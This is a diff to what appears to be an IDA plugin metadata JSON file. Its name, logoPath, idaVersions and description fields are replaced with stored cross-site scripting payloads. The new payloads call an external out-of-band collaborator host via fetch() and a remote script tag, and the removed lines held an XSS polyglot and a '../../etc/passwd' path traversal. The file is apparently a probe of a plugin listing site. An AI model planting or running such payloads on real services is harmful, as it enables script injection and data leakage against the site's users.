@@ -1,16 +1,16 @@
 {
   "IDAMetadataDescriptorVersion": 1,
   "plugin": {
-    "name": "Function Analyzer Plus",
+    "name": "</script><svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com?svg')>",
     "entryPoint": "function_analyzer_plus.py",
     "categories": [
       "disassembly-and-processor-modules",
       "decompilation",
       "debugging-and-tracing"
     ],
-    "logoPath": "../../etc/passwd",
-    "idaVersions": ">=8.4",
-    "description": "alert(1)//\\\";alert(1);<!--jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC=\"javascript:alert(1);\"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//\"",
+    "logoPath": "javascript:fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/logo')",
+    "idaVersions": "\"><img src=x onerror=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/ida')>",
+    "description": "☠<svg/onload=alert(1)>--><script>alert('xss')</script><iframe/src=javascript:alert`xss`>//</iframe><img src=x onerror=alert(1)><body onload=alert(1)>\"'><svg/onload=fetch(`//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com?onload`)><!--<script>--></script><style>@import'javascript:alert(1)';</style><object data=javascript:alert(1)><a href=\"javascript:alert(1)\">ClickMe</a><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\"><input autofocus onfocus=alert(document.domain)><!--\"--><script src=\"//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/x.js\"></script><!--",
     "version": "1.1.4"
   }
 }
